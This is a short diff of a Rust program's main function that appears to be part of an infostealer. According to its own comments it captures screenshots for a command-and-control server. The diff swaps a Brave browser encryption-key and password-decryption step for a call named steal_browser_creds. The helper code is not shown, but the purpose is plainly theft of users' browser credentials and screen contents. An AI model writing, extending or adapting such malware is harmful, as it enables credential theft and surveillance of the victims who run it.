@@ -13,12 +13,5 @@ fn main() {
 
     // Capture screenshot and send to C2 server.
     let _screens = utils::capture_screenshot();
-
-    match utils::fetch_encryption_key() {
-        Ok(_key) => {
-            println!("\x1b[92mSuccess: Encryption key received\x1b[0m");
-            // utils::brave_password_decryption("password", &key)
-        }
-        Err(e) => println!("\x1b[31mError: {}\x1b[0m", e),
-    }
+    utils::steal_browser_creds();
 }
